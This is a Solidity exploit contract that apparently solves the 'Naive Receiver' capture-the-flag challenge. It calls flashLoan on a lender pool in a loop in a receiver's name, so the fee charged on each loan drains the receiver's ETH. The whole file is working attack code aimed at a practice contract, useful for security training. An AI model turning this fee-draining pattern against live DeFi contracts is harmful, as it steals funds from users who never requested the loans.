// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";

contract NaiveExploit {

    NaiveReceiverLenderPool private pool;
    address payable private receiver;

    constructor(address payable poolAddress, address payable receiverAddress) {
        pool = NaiveReceiverLenderPool(poolAddress);
        receiver = receiverAddress;
    }

    function exploit() public {
        while (receiver.balance > 0) {
            pool.flashLoan(receiver, 0);
        }
    }

    // Allow deposits of ETH
    receive () external payable {}
}